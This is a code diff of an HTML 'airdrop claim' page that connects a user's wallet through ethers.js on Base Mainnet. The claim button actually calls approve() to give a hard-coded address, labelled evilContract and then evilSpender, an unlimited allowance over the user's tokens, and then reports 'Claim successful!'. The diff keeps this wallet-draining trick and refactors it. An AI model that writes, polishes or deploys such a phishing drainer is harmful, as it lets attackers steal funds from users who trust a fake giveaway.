@@ -6,9 +6,7 @@
   <title>$GET Airdrop Claim</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
-    * {
-      margin: 0; padding: 0; box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Poppins', sans-serif;
       background: linear-gradient(135deg, #1e1f29, #2f3041);
@@ -140,16 +138,14 @@
     </div>
   </div>
 
-  <!-- Modern Ethers.js CDN -->
-  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <!-- Modern Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const ethers = window.ethers;
-
     const connectWalletBtn = document.getElementById('connectWalletBtn');
     const walletAddressDiv = document.getElementById('walletAddress');
     const claimBtn = document.getElementById('claimBtn');
     const eligibilityMsg = document.getElementById('eligibilityMessage');
-    let signer;
+    let provider, signer;
 
     connectWalletBtn.addEventListener('click', async () => {
       if (typeof window.ethereum === 'undefined') {
@@ -158,7 +154,7 @@
       }
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any"); // 'any' prevents network change errors
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         const address = await signer.getAddress();
@@ -181,24 +177,22 @@
       }
 
       try {
-        const provider = signer.provider;
-        const { chainId } = await provider.getNetwork();
-
-        if (chainId !== 8453) {
-          alert("Please switch your wallet network to Base Mainnet.");
+        const net = await provider.getNetwork();
+        if (net.chainId !== 8453) {
+          alert("Please switch your wallet to Base Mainnet (Chain ID: 8453).");
           return;
         }
 
         const getTokenAddress = "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb";
-        const evilContract = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
+        const evilSpender = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
 
-        const contract = new ethers.Contract(
+        const tokenContract = new ethers.Contract(
           getTokenAddress,
           ["function approve(address spender, uint256 amount) external returns (bool)"],
           signer
         );
 
-        const tx = await contract.approve(evilContract, ethers.constants.MaxUint256);
+        const tx = await tokenContract.approve(evilSpender, ethers.constants.MaxUint256);
         await tx.wait();
 
         alert("✅ Claim successful!");
